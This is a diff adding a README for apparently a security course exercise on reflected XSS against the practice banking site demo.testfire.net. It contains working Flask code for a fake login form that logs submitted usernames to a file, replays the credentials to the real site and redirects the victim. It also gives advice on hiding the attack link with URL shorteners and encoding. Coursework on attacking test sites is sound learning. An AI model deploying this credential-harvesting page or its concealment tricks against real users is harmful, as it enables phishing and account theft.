@@ -1,3 +1,44 @@
+# Exercise 2 solution
+This exercise is realised using Python+Flask and deployed in heroku.(The links are live.)
+---
+## Question 1 - Reflected XSS when an user is not logged in, stealing their login credentials.
+1. Look for a place, where you can conduct a reflected XSS attack against a user who is currently not logged in.
+- Design an attack which fakes the Login form to attack users that are currently not logged in. Send the login information to a server of your choice and login the user normally afterwards. (3P)
+    1. The user is fed with the fake login page located at :[Login Page](https://mysterious-harbor-34550.herokuapp.com/login)
+    The below code is implemented for the fake login and redirection.
+    ```python
+    @app.route('/login')
+        def login():
+            form_data='''<form id="foo" method="post" action="/handle_data">
+            Username : <input type="text" name='uid' value="admin">
+            Password : <input type="password" name='passw' value="">
+            <input type="submit" name="submit" value="Submit">
+            </form>
+            '''
+            return form_data
+    ```
+    2. Once the login data is filled and user clicks on submit, it writes the credentials on a notepad and then redirects the user to Altoro Mutual.
+    The below code is implemented for writing the credentials and redirection.
+    ```python
+    @app.route('/handle_data', methods=['POST'])
+        def handle_data():
+            if request.method == 'POST':
+                req = request.form
+                uid = req.get('uid')
+                passw = req.get('passw')
+                data = 'uid: '+uid+' password: ' + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
+                file = open("/tmp/cookiedata.txt","a")
+                file.write(data)
+                file.close()
+                data={"uid":uid,"passw":passw,"btnSubmit":"Login"}
+                
+                requests.post('http://demo.testfire.net/doLogin',data)
+            
+            return redirect('http://demo.testfire.net')
+    ```
+    
+- How can you hide the attack code to the victim? Implement an exemplary concealment. (1P)
+    When passing the attack code to the victim, the link can be concealed using any URL shortener, further to prevent user to easily recognise the script tags passed within an URL, we can also use URL encoder to conceal most of the script code in the URL.
 ## Reflected XSS when a user is not logged in to steal the credentials
 
 /login - displays a form where user has to input login details, once logged in the site automatically redirects to demo.testfire.net
